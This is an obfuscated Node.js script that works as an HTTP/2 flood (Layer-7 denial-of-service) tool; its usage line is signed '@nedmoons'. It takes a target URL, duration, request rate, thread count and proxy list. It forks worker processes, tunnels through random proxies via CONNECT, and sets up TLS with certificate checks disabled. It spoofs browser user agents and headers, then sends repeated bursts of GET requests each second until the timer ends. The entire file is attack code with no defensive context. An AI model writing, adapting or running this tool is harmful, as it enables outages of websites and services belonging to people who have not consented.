const daely = deyanna;
(function (dorismae, jadelynne) {
  const eustolio = deyanna, bhavik = dorismae();
  while (true) {
    try {
      const laderick = -parseInt(eustolio(441)) / 1 + parseInt(eustolio(449)) / 2 + parseInt(eustolio(514)) / 3 * (parseInt(eustolio(433)) / 4) + parseInt(eustolio(482)) / 5 + parseInt(eustolio(469)) / 6 * (-parseInt(eustolio(438)) / 7) + -parseInt(eustolio(436)) / 8 * (parseInt(eustolio(516)) / 9) + -parseInt(eustolio(432)) / 10;
      if (laderick === jadelynne) break; else bhavik.push(bhavik.shift());
    } catch (abdussamad) {
      bhavik.push(bhavik.shift());
    }
  }
}(redge, 929160));
const net = require(daely(450)), http2 = require(daely(442)), tls = require(daely(445)), cluster = require(daely(499)), url = require(daely(451)), crypto = require(daely(459)), UserAgent = require(daely(488)), fs = require("fs"), {HeaderGenerator} = require(daely(507));
process[daely(471)](0), require(daely(454))[daely(440)].defaultMaxListeners = 0, process.on(daely(518), function (tsuneo) {});
process.argv[daely(489)] < 7 && (console[daely(501)](daely(478)), process[daely(496)]());
const headers = {};
function readLines(devontrey) {
  const kimora = daely;
  return fs.readFileSync(devontrey, kimora(439)).toString()[kimora(473)](/\r?\n/);
}
function redge() {
  const kavarion = ["events", "https://google.com", "connect", "setKeepAlive", "desktop", "crypto", "time", " / HTTP/2", "Cookie", "error: ", "target", "random", "accept-language", "from", "CONNECT ", "606LMpVwE", "error: timeout exceeded", "setMaxListeners", "pragma", "split", "Rate", "timeout", "user-agent", "error: invalid response from proxy server", "node tls.js host time req conn proxy @nedmoons", "argv", "includes", "parse", "4827340ZoUNif", ":443\r\nConnection: Keep-Alive\r\n\r\n", "href", "end", "floor", "close", "user-agents", "length", "trailers", "response", "threads", ":path", "path", ":443", "exit", "HTTP/1.1 200", "fork", "cluster", "data", "log", "x-requested-with", "upgrade-insecure-requests", "accept", "write", "no-cache", "header-generator", "accept-encoding", "windows", "HTTP", "Connection", "toString", ":authority", "1123422jpGddL", ":443 HTTP/1.1\r\nHost: ", "9CUooqi", "keep-alive", "uncaughtException", "proxyFile", "876930KwqzCs", "8vtDauG", "GREASE:X25519:x25519", "GET", "1852792Eicctb", "destroy", "46249ENBckc", "utf-8", "EventEmitter", "1254681HGVxSB", "http2", "address", "host", "tls", "error", "request", "https", "2912048FDuoGO", "net", "url", "firefox", "isMaster"];
  redge = function () {
    return kavarion;
  };
  return redge();
}
function randomIntn(ravonda, nirvaan) {
  const shanasia = daely;
  return Math[shanasia(486)](Math[shanasia(465)]() * (nirvaan - ravonda) + ravonda);
}
function randomElement(mitzy) {
  const marquae = daely;
  return mitzy[randomIntn(0, mitzy[marquae(489)])];
}
const args = {target: process.argv[2], time: ~~process[daely(479)][3], Rate: ~~process[daely(479)][4], threads: ~~process[daely(479)][5], proxyFile: process[daely(479)][6]};
function deyanna(laekyn, ukiah) {
  const lens = redge();
  return deyanna = function (carragan, minesh) {
    carragan = carragan - 432;
    let krysha = lens[carragan];
    return krysha;
  }, deyanna(laekyn, ukiah);
}
var proxies = readLines(args[daely(519)]);
const parsedTarget = url[daely(481)](args[daely(464)]);
let headerGenerator = new HeaderGenerator({browsers: [{name: daely(452), minVersion: 100, httpVersion: "2"}], devices: [daely(458)], operatingSystems: [daely(509)], locales: ["en-US", "en"]});
if (cluster[daely(453)]) for (let counter = 1; counter <= args[daely(492)]; counter++) {
  cluster[daely(498)]();
} else setInterval(runFlooder);
class NetSocket {
  constructor() {}
  [daely(510)](_0xc92779, _0x59f60c) {
    const shindana = daely, beonica = _0xc92779[shindana(443)].split(":"), aimar = beonica[0], enayah = shindana(468) + _0xc92779[shindana(443)] + shindana(515) + _0xc92779.address + shindana(483), eurasia = new Buffer[shindana(467)](enayah), trequon = net.connect({host: _0xc92779.host, port: _0xc92779.port});
    trequon.setTimeout(_0xc92779[shindana(475)] * 1e4), trequon[shindana(457)](true, 6e4), trequon.on(shindana(456), () => {
      const bridgete = shindana;
      trequon[bridgete(505)](eurasia);
    }), trequon.on(shindana(500), dontario => {
      const steffon = shindana, samoan = dontario[steffon(512)]("utf-8"), adien = samoan[steffon(480)](steffon(497));
      if (adien === false) return trequon[steffon(437)](), _0x59f60c(undefined, steffon(477));
      return _0x59f60c(trequon, undefined);
    }), trequon.on(shindana(475), () => {
      const zacora = shindana;
      return trequon.destroy(), _0x59f60c(undefined, zacora(470));
    }), trequon.on(shindana(446), elric => {
      const adrienne = shindana;
      return trequon[adrienne(437)](), _0x59f60c(undefined, adrienne(463) + elric);
    });
  }
}
const Header = new NetSocket;
headers[":method"] = daely(435), headers.GET = daely(461), headers[daely(493)] = parsedTarget[daely(494)], headers[":scheme"] = daely(448), headers.Referer = daely(455), headers.accept = randomHeaders[daely(504)], headers[daely(466)] = randomHeaders[daely(466)], headers[daely(508)] = randomHeaders["accept-encoding"], headers[daely(511)] = daely(517), headers[daely(503)] = randomHeaders[daely(503)], headers.TE = daely(490), headers[daely(502)] = "XMLHttpRequest", headers[daely(472)] = daely(506), headers[daely(462)] = randomHeaders.cookie;
function runFlooder() {
  const shiya = daely, torren = randomElement(proxies), cristie = torren[shiya(473)](":"), kaion = new UserAgent;
  var ethian = kaion.toString();
  headers[shiya(513)] = parsedTarget[shiya(444)], headers[shiya(476)] = ethian;
  const gelisha = {host: cristie[0], port: ~~cristie[1], address: parsedTarget[shiya(444)] + shiya(495), timeout: 100};
  Header.HTTP(gelisha, (khaliliah, jaelynne) => {
    const rameen = shiya;
    if (jaelynne) return;
    khaliliah.setKeepAlive(true, 6e4);
    const jekori = {ALPNProtocols: ["h2"], followAllRedirects: true, challengeToSolve: 5, clientTimeout: 5e3, clientlareMaxTimeout: 15e3, echdCurve: rameen(434), ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", rejectUnauthorized: false, socket: khaliliah, decodeEmails: false, honorCipherOrder: true, requestCert: true, secure: true, port: 443, uri: parsedTarget[rameen(444)], servername: parsedTarget[rameen(444)]}, antowine = tls[rameen(456)](443, parsedTarget[rameen(444)], jekori);
    antowine.setKeepAlive(true, 6e5);
    const broghan = http2[rameen(456)](parsedTarget[rameen(484)], {protocol: "https:", settings: {headerTableSize: 65536, maxConcurrentStreams: 1e3, initialWindowSize: 6291456, maxHeaderListSize: 262144, enablePush: false}, maxSessionMemory: 64e3, maxDeflateDynamicTableSize: 4294967295, createConnection: () => antowine, socket: khaliliah});
    broghan.settings({headerTableSize: 65536, maxConcurrentStreams: 2e4, initialWindowSize: 6291456, maxHeaderListSize: 262144, enablePush: false}), broghan.on("connect", () => {
      const bracha = setInterval(() => {
        const jnaiya = deyanna;
        for (let tailani = 0; tailani < args[jnaiya(474)]; tailani++) {
          const verdena = broghan[jnaiya(447)](headers).on(jnaiya(491), colinda => {
            const greysyn = jnaiya;
            verdena.close(), verdena[greysyn(437)]();
            return;
          });
          verdena[jnaiya(485)]();
        }
      }, 1e3);
    }), broghan.on(rameen(487), () => {
      const micca = rameen;
      broghan[micca(437)](), khaliliah[micca(437)]();
      return;
    }), broghan.on(rameen(446), avanthika => {
      const hawanatu = rameen;
      broghan[hawanatu(437)](), khaliliah[hawanatu(437)]();
      return;
    });
  });
}
const KillScript = () => process[daely(496)](1);
setTimeout(KillScript, args[daely(460)] * 1e3);
